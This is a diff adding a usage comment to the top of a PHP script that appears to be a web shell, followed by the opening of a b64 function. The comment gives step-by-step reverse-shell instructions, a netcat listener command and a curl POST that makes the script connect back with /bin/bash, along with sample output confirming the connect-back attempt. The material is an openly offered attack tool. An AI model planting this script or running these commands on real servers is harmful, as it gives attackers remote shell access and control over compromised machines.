@@ -1,5 +1,47 @@
 <?php
+/* 
+to get a reverse shell simply execute the following 2 commands:
 
+
+#1) To start your listener, execute this command: nc -nvlp 8099 
+#2) To initiate the reverse conncetion from the server back to your local machine:
+      clear;curl http://127.0.0.1:8099/sp.php --data "rcom=1&mthd=bash&host=&port=8099&shell=" -v
+
+The result of the above post request to this script should produce something like this:
+    
+        Note: Unnecessary use of -X or --request, POST is already inferred.
+        *   Trying 127.0.0.1...
+        * TCP_NODELAY set
+        * Connected to 127.0.0.1 (127.0.0.1) port 8099 (#0)
+        > POST /sp.php HTTP/1.1
+        > Host: 127.0.0.1:8099
+        > User-Agent: curl/7.60.0
+        > Content-Length: 39
+        > Content-Type: application/x-www-form-urlencoded
+        > 
+        * upload completely sent off: 39 out of 39 bytes
+        < HTTP/1.1 200 OK
+        < Host: 127.0.0.1:8099
+        < Date: Mon, 03 Aug 2020 22:30:09 +0000
+        < Connection: close
+        < X-Powered-By: PHP/7.2.5
+        < Content-type: text/html; charset=UTF-8
+        < 
+
+        Host was empty, using: 127.0.0.1
+
+        Shell was empty, using default: /bin/bash
+
+        Attempting to connect back, ensure you have the listener running.
+
+        Using: bash
+        Rhost: 127.0.0.1
+        Rport: 8099
+        Lshell: /bin/bash
+
+         Closing connection 0
+
+*/
 function b64($target, $how, $data, $ext, $dir)
 {
     /*
